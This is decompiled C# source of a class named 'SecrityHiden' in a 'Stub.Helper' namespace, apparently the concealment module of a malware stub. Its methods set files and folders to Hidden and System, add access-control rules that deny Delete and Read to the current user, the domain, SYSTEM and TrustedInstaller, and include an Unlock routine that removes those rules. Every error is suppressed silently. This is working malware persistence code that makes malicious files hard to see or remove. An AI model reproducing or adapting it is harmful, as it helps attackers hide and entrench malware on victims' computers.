using System;
using System.IO;
using System.Security.AccessControl;
using System.Threading;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000023 RID: 35
	internal class SecrityHiden
	{
		// Token: 0x060000B0 RID: 176 RVA: 0x00005E8C File Offset: 0x0000408C
		public static void Unlock(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				if (fileInfo.Attributes == FileAttributes.Directory)
				{
					try
					{
						SecrityHiden.RemoveFileSecurity(fileInfo.Directory.FullName, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
						SecrityHiden.RemoveFileSecurity(fileInfo.Directory.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
						if (Convert.ToBoolean(Settings.isadmin))
						{
							SecrityHiden.RemoveFileSecurity(fileInfo.Directory.FullName, "System", FileSystemRights.Delete, AccessControlType.Deny);
							SecrityHiden.RemoveFileSecurity(fileInfo.Directory.FullName, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
						}
						goto IL_12B;
					}
					catch
					{
						goto IL_12B;
					}
				}
				try
				{
					SecrityHiden.RemoveFolderSecurity(fileInfo.FullName, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
					SecrityHiden.RemoveFolderSecurity(fileInfo.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
					if (Convert.ToBoolean(Settings.isadmin))
					{
						SecrityHiden.RemoveFolderSecurity(fileInfo.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
						SecrityHiden.RemoveFolderSecurity(fileInfo.FullName, "System", FileSystemRights.Delete, AccessControlType.Deny);
						SecrityHiden.RemoveFolderSecurity(fileInfo.FullName, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
					}
				}
				catch
				{
				}
				IL_12B:
				fileInfo.Directory.Attributes = FileAttributes.Normal;
				fileInfo.Attributes = FileAttributes.Normal;
			}
			catch
			{
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00006030 File Offset: 0x00004230
		public static void HidenFolder(string path)
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				if (Convert.ToBoolean(Settings.isadmin))
				{
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
				}
				else
				{
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				SecrityHiden.AddFolderSecurity(path, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, Environment.UserName, FileSystemRights.Read, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, Environment.UserName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFolderSecurity(path, Environment.UserName, FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.Read, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.Read, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "System", FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "System", FileSystemRights.Read, AccessControlType.Deny);
				SecrityHiden.AddFolderSecurity(path, "System", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFolderSecurity(path, "System", FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
			}
			catch
			{
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000061B0 File Offset: 0x000043B0
		public static void HidenFile(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				if (Convert.ToBoolean(Settings.isadmin))
				{
					fileInfo.Attributes = (FileAttributes.Hidden | FileAttributes.System);
				}
				else
				{
					fileInfo.Attributes = FileAttributes.Hidden;
				}
				SecrityHiden.AddFileSecurity(path, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFileSecurity(path, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFileSecurity(path, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFileSecurity(path, "System", FileSystemRights.Delete, AccessControlType.Deny);
				SecrityHiden.AddFileSecurity(path, Environment.UserName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFileSecurity(path, "TrustedInsraller", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFileSecurity(path, Environment.UserDomainName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				SecrityHiden.AddFileSecurity(path, "System", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			}
			catch
			{
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00006294 File Offset: 0x00004494
		public static void RemoveFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				FileSecurity accessControl = File.GetAccessControl(fileName);
				accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
				File.SetAccessControl(fileName, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x000062DC File Offset: 0x000044DC
		public static void RemoveFolderSecurity(string path, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				DirectorySecurity accessControl = Directory.GetAccessControl(path);
				accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
				Directory.SetAccessControl(path, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00006324 File Offset: 0x00004524
		public static void AddFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				FileSecurity accessControl = File.GetAccessControl(fileName);
				accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
				File.SetAccessControl(fileName, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x0000636C File Offset: 0x0000456C
		public static void AddFolderSecurity(string path, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				DirectorySecurity accessControl = Directory.GetAccessControl(path);
				accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
				Directory.SetAccessControl(path, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}
	}
}
